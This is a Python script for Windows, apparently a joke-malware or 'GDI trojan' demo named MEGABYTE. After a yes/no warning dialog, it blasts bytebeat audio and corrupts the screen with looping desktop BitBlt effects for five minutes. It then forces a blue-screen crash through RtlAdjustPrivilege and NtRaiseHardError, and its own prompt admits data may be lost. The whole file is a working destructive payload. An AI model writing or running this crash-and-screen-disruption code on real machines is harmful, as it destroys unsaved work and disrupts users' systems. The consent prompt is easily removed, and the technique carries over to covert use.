import numpy as np
import pyaudio
import win32gui
import win32api
import win32con
import ctypes
import colorsys
import random
import threading
import time
import sys

# Button constants
MB_OK = 0x0
MB_OKCANCEL = 0x1
MB_ABORTRETRYIGNORE = 0x2
MB_YESNOCANCEL = 0x3
MB_YESNO = 0x4
MB_RETRYCANCEL = 0x5
MB_CANCELTRYCONTINUE = 0x6

# Icon constants
MB_ICONHAND = 0x10
MB_ICONQUESTION = 0x20
MB_ICONEXCLAMATION = 0x30
MB_ICONASTERISK = 0x40
MB_ICONWARNING = MB_ICONEXCLAMATION
MB_ICONERROR = MB_ICONHAND
MB_ICONINFORMATION = MB_ICONASTERISK

# Default button constants
MB_DEFBUTTON1 = 0x0
MB_DEFBUTTON2 = 0x100
MB_DEFBUTTON3 = 0x200
MB_DEFBUTTON4 = 0x300

# Modality constants
MB_APPLMODAL = 0x0
MB_SYSTEMMODAL = 0x1000
MB_TASKMODAL = 0x2000

# Other constants
MB_DEFAULT_DESKTOP_ONLY = 0x20000
MB_RIGHT = 0x80000
MB_RTLREADING = 0x100000
MB_SETFOREGROUND = 0x10000
MB_TOPMOST = 0x40000
MB_SERVICE_NOTIFICATION = 0x200000

response = ctypes.windll.user32.MessageBoxW(
    0, "This program will flood your computer with awesomeness, and then, BSOD. \n Please close all programs before running this program. \n Creator not responsible for lost data. Understood?", 
    "MEGABYTE", 
    MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON2
)

if response == 6:  # User clicked 'Yes'
    # Set up user32 for screen metrics
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    SAMPLE_RATE = 8000
    BUF_SIZE = 8000

    def fill_buffer(t):
        buffer = np.zeros(BUF_SIZE, dtype=np.uint8)
        for i in range(BUF_SIZE):
            buffer[i] = (t * ((t & 4096 and 6 or 16) + (1 & t >> 14)) >> (3 & t >> 8) | t >> (t & 4096 and 3 or 4)) & 255
            t += 1
        return buffer

    def trigger_bsod():
        if sys.platform == 'win32':
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    
    def play_audio():
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paUInt8,
                        channels=1,
                        rate=SAMPLE_RATE,
                        output=True)
        t = 0

        try:
            while True:
                buffer = fill_buffer(t)
                stream.write(buffer.tobytes())
                t += BUF_SIZE
        except KeyboardInterrupt:
            pass

        stream.stop_stream()
        stream.close()
        p.terminate()

    def display_gdi():
        color = 0
        hdc = win32gui.GetDC(0)

        try:
            while True:
                rgb_color = colorsys.hsv_to_rgb(color, 1.0, 1.0)
                brush = win32gui.CreateSolidBrush(
                    win32api.RGB(int(rgb_color[0] * 255), int(rgb_color[1] * 255), int(rgb_color[2] * 255))
                )
                win32gui.SelectObject(hdc, brush)
                win32gui.BitBlt(
                    hdc, random.randint(-10, 10), random.randint(-10, 10),
                    sw, sh, hdc, 0, 0, win32con.SRCCOPY
                )
                win32gui.BitBlt(
                    hdc, random.randint(-10, 10), random.randint(-10, 10),
                    sw, sh, hdc, 0, 0, win32con.PATINVERT
                )
                color += 0.05
        except KeyboardInterrupt:
            pass

    def main():
        audio_thread = threading.Thread(target=play_audio)
        gdi_thread = threading.Thread(target=display_gdi)

        audio_thread.start()
        gdi_thread.start()

        time.sleep(5 * 60)  # Wait for 5 minutes

        trigger_bsod()

        audio_thread.join()
        gdi_thread.join()

    if __name__ == "__main__":
        main()

elif response == 7:  # User clicked 'No'
    exit()
